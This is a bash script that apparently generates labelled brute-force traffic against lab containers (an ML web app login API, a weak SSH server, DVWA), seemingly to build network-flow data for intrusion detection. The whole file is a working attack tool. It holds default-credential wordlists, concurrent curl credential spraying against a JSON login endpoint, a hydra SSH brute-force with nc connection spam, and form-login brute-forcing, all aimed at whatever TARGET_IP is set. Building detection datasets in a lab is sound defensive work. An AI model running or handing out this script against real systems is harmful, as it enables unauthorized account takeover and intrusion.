#!/bin/bash
# BruteForce Attack — HTTP Login + SSH credential stuffing
# Creates DISTINCTIVE flow signatures:
#   Phase 1: HTTP POST JSON to /api/login — rapid credential spray (many 401s)
#   Phase 2: SSH brute-force on port 2222 (weak-ssh container, hydra)
#   Phase 3: HTTP form POST to DVWA /login.php
#
# Environment: TARGET_IP, DURATION (seconds)
set -e

TARGET="${TARGET_IP:?TARGET_IP not set}"
DUR="${DURATION:-60}"

echo "[BruteForce] Starting multi-service brute-force on $TARGET for ${DUR}s"

# Create wordlists
cat > /tmp/users.txt << 'EOF'
root
admin
user
test
ubuntu
deploy
www-data
analyst
manager
demo
operator
guest
sysadmin
devops
backup
EOF

cat > /tmp/passwords.txt << 'EOF'
password
123456
admin
root
letmein
password1
12345678
qwerty
abc123
monkey
welcome
pass123
changeme
toor
1234
password123
admin123
test
guest
default
analyst2024
admin2024
P@ssw0rd
secret
EOF

# ═══════════════════════════════════════════════════════════
# Phase 1: HTTP Login Brute-Force (50% of time)
# Target: ML WebApp /api/login endpoint on port 3000
# Pattern: Rapid JSON POST requests with different credentials
# ═══════════════════════════════════════════════════════════
HTTP_LOGIN_DUR=$((DUR * 50 / 100))
echo "[BruteForce] Phase 1: HTTP /api/login brute-force for ${HTTP_LOGIN_DUR}s"
HTTP_END=$(($(date +%s) + HTTP_LOGIN_DUR))

ATTEMPT=0
while [ "$(date +%s)" -lt "$HTTP_END" ]; do
    # Spray credentials in parallel bursts (6 concurrent requests)
    for user in admin root user test analyst demo operator sysadmin; do
        for pass in password 123456 admin root letmein qwerty admin123 P@ssw0rd; do
            if [ "$(date +%s)" -ge "$HTTP_END" ]; then break 2; fi
            curl -s -o /dev/null -w "%{http_code}" -m 3 \
                -X POST \
                -H "Content-Type: application/json" \
                -d "{\"username\":\"${user}\",\"password\":\"${pass}\"}" \
                "http://${TARGET}:3000/api/login" 2>/dev/null &
            ATTEMPT=$((ATTEMPT + 1))
            # Keep 6 concurrent connections max
            if [ $((ATTEMPT % 6)) -eq 0 ]; then
                wait
                sleep 0.1
            fi
        done
    done
    wait
    sleep 0.2
done
echo "[BruteForce] Phase 1 complete: ~${ATTEMPT} login attempts"

# ═══════════════════════════════════════════════════════════
# Phase 2: SSH Brute-Force on port 2222 (30% of time)
# Target: weak-ssh container (rastasheep/ubuntu-sshd)
# Pattern: hydra parallel auth attempts + raw SSH banner grabs
# ═══════════════════════════════════════════════════════════
SSH_DUR=$((DUR * 30 / 100))
echo "[BruteForce] Phase 2: SSH brute-force port 2222 for ${SSH_DUR}s"
timeout "${SSH_DUR}" hydra -L /tmp/users.txt -P /tmp/passwords.txt \
    -t 16 -f -vV -I -s 2222 ssh://"${TARGET}" 2>&1 | tail -5 &
HYDRA_PID=$!

# Parallel raw TCP SSH connection spam for flow volume
P2_END=$(($(date +%s) + SSH_DUR))
while [ "$(date +%s)" -lt "$P2_END" ]; do
    for i in $(seq 1 8); do
        echo "SSH-2.0-PuTTY_Brute" | nc -w 2 "$TARGET" 2222 2>/dev/null &
    done
    wait 2>/dev/null
    sleep 0.5
done &
sleep "$SSH_DUR" || true
kill $HYDRA_PID 2>/dev/null || true
wait 2>/dev/null || true

# ═══════════════════════════════════════════════════════════
# Phase 3: HTTP Form Brute-Force on DVWA port 8080 (20% of time)
# Target: DVWA /login.php
# Pattern: Repeated form POST with different credentials
# ═══════════════════════════════════════════════════════════
DVWA_DUR=$((DUR * 20 / 100))
echo "[BruteForce] Phase 3: DVWA HTTP form brute-force for ${DVWA_DUR}s"
DVWA_END=$(($(date +%s) + DVWA_DUR))

while [ "$(date +%s)" -lt "$DVWA_END" ]; do
    for user in root admin user test guest deploy; do
        for pass in password 123456 admin root letmein qwerty; do
            curl -s -o /dev/null -m 2 -X POST \
                -d "username=${user}&password=${pass}&Login=Login" \
                "http://${TARGET}:8080/login.php" 2>/dev/null &
        done
    done
    wait
    sleep 0.2
done

echo "[BruteForce] Attack complete"
